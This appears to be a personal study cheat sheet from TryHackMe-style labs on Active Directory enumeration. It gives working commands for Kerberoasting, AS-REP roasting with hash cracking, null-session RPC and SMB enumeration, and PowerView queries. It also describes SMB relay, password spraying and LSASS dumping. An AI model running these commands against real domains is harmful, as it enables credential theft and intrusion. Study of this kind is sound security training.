# Active Directory Enumeration



## Important Ports

| 88  | Kerberos           | Potential for Kerberos-based enumeration      |
| --- | ------------------ | --------------------------------------------- |
| 135 | MS-RPC             | Potential for RPC enumeration (null sessions) |
| 139 | SMB/NetBIOS        | Legacy SMB access                             |
| 389 | LDAP               | LDAP queries to AD                            |
| 445 | SMB                | Modern SMB access, critical for enumeration   |
| 464 | Kerberos (kpasswd) | Password-related Kerberos service             |

## Authenticated Enumeration

### Kerberoasting

Requires access to Service Principal Name (SPN) accounts such as IIS user, MSSQL, etc. Involves requesting a TGT and TGS.

`python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.120.81 THM.red/thm` to find SPN accounts

`python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.120.81 THM.red/thm -request-user svc-user` to request a TGS ticket for the srv-users

Decrypt with hashcat using `13100` mode

### (Legacy) AS-REP Roasting

Relies on an old Kerberos authentication protocol. Technique that involves taking advantage of the timestamp validation (user's hash encrypts a timestamp, KDC decrypts it to verify user's identity) being skipped when pre-authentication is disabled. It instead returns an encrypted AS-REP blob without validating timestamp.

**Finding Vulnerable Accounts**

* `Rubeus.exe asreproast` on Windows
* `GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass` on Linux

**Exploitation, cracking password hashes and accessing network**

`hashcat -m 18200 hashes.txt wordlist.txt` crack AS-REP hashes (mode `18200` )

### SMB Relay Attack

Technique that abuses the NTLM authentication mechanism by performing an Man-in-the-Middle attack to monitor and capture SMB packets and extract hashes. (Note: **SMB signing, security check for integrity and ensures the communication is between trusted sources, must be disabled)**



### Manual Enumeration

Process of using shell and Powershell commands to explore token privileges and identifying domain and local users. This is a Living-Off-the-Land (LOTL) technique.

#### **Enumerating Users and Groups with NET commands**

`NET`  is a suite of commands for viewing and managing networked resources. **Best for quick checks on small, legacy domains.z**

`net user /domain` for viewing every user in the domain

`net user USERNAME /domain` to view a specific user in the domain

`net user` to view the local users

`net group /domain` to view domain groups

`net group GROUP_NAME /domain` to view users in groups

`net localgroup` to view local groups

#### Logged on User and Sessions

`query user`  to list user logged on to a machine

{% hint style="info" %}
Finding an Administrator logged into a machine is a big win because we can dump the LSASS to get their credentials or tokens.
{% endhint %}

#### Powershell Enumeration

`ActiveDirectory` module must be downloaded on the Workstations to use the following commands.

`Get-ADUser -Identity USERNAME` to check user details

* `-Properties *` to check ALL userâ€™s properties, some important properties:
  * `LastLogonDate`
  * `MemberOf`
  * `Description`
  * `Title`
* `-Filter "Name -like '*admin*'"` to filter for admin

`Get-ADGroup -Filter *` to get all groups

`Get-ADGroupMember -Identity "Group Name"` to get all members in group

`Get-ADComputer -Filter *` to enumerate computers

`Get-ADDefaultDomainPasswordPolicy` to get password policy

#### Powerview&#x20;

Module that is part of the poweersploit framework.

`Get-DomainUser` to dump domains users

* `Get-DomainUser filter` to add filters
* `-AdminCount`  list of admin privileges accounts
* `-SPN` for non-null service principle names (SPN)

`Get-DomainGroup`

`Get-DomainComputer`

## Unauthenticated Enumeration

### Network Enumeration with SMB

SMB shares are usually hosted on the Domain Controller (DC).

`smbclient //TARGET_IP/SHARE_NAME OPTION` to access SMB shares (similar to FTP client)&#x20;

* `-L` to list the shares
* `-N` to access a share with no password
* `--user=USERNAME --password=PASSWORD` to specify authentication

`smbmap -H TARGET_IP` enumerate SMB shares across a host displaying read and write permissions

`nmap -p445 --script smb-enum-shares TARGET_IP` enumerate SMB shares across a host

`impacket-smbclient`, `crackmapexec`, `enum4linux` are other tools

{% hint style="info" %}
SMB shares can usually contain configuration and backup files, scripts and even documents that could have hidden secrets.
{% endhint %}

### Domain Enumeration

Some LDAP servers allow anonymous users to perform read-only queries.

`ldapsearch -x -H ldap://IP_ADDRESS -s base`&#x20;

* `-x` Simple authentication, in our case, anonymous authentication.
* `-H` Specifies the LDAP server.
* `-s` Limits the query only to the base object and does not search subtrees or children

`enum4linux-ng -A 10.211.11.10 -oA results.txt`  to automate enumeration techniques using SMB and RPC protocols

* `-A` Performs all available enumeration functions (users, groups, shares, password policy, RID cycling, OS information and NetBIOS information).
* `-oA` Writes output to YAML and JSON files.

#### Microsoft Remote Procedure Call (MSRPC)

Tool that enables a program running on one computer to request services from another computer over the SMB protocol. If the SMB server allows null sessions we can access the Inter-Process Communication (`IPC$`) allowing you to query directory information (usernames, groups, network shares...)

`rpcclient -U "" 10.211.11.10 -N` to access the `IPC$` share with no Username or `-N`  no password. Followed by `enumdomusers` to enumerate.

#### RID Cycling

`enum4linux-ng` allows us to enumerate these RIDs. If restricted we can also use a bash script that queries individual RIDs.

#### Username Enumerating with Kerbrute

Abuses the pre-authentication phase of the Kerberos authentication. Allows  you to avoid disabled accounts, non-domain accounts, fake honeypot users, and false positives

#### Password Spraying

Involves use a small set of common password tested across many account. Different approach than brute force as each account only tests a small set of password not every possible combination. To start this attack we must understand the Password Policy with `rpcclient` followed by `getdompwinfo` .'
